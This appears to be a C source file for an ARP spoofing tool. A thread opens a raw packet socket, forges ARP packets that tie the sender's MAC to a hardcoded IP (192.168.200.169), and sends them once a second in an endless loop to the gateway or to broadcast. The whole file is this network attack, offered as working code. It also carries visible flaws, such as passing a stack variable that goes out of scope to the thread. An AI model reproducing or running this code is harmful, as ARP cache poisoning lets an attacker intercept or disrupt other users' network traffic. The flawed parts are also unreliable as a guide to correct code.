#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>

#include "resolve_parameter.h"
#include "thread_cheat.h"
#include "netlib.h"

void thread_cheat(const struct parameter *par)
{
	pthread_t tidp;
	struct cheat_argv argv;
	argv.broad = 0;
	argv.device_name = (char *)par->device_name;
	argv.sender_ip = "192.168.200.169";
	argv.target_ip = "192.168.200.1";

	pthread_create(&tidp, NULL, (void *(*)(void *))cheat_target, (void *)&argv);	
	
	return;
}

void cheat_target (void *argv)
{
	int cheat_socket;
	const struct cheat_argv *par = (struct cheat_argv *)argv;
	ARP_PACKAGE arp;
	int i;
	unsigned char src_mac[6], dst_mac[6];
	struct sockaddr_ll to = {0};

	to.sll_family = PF_PACKET;
	to.sll_ifindex = if_nametoindex(par->device_name);

	printf("in the thread,print the parameter.\n");

	if ((cheat_socket = socket(AF_PACKET, SOCK_RAW, \
						htonl(ETH_P_ARP))) == -1)
	{
		perror("socket");
		exit(1);
	}

	if (!get_my_mac_addr(src_mac, par->device_name))
	{
		printf("Cannot get %s device mac address.Please cheack your network connection.\n", par->device_name);

		pthread_exit(NULL);                         	
	}                                               	
                                                    	
	if (par->broad == 1)
	{
		for (i = 0; i < 6; i++)
		{	
			dst_mac[i] = 0xff;
		}
			fill_the_eth(&arp.eth, dst_mac, src_mac, ARP);
	}
	else
	{
		get_gateway_mac(dst_mac);
		fill_the_eth(&arp.eth, dst_mac, src_mac, ARP);
	}
	
	fill_the_arp(&arp.arp, src_mac, par->sender_ip, \
			dst_mac, par->target_ip);



	while (1)
	{
		sendto(cheat_socket, (char *)&arp, sizeof(arp), 0, \
				(struct sockaddr *)&to, sizeof(to));
		printf(">");
		sleep(1);
	}

}
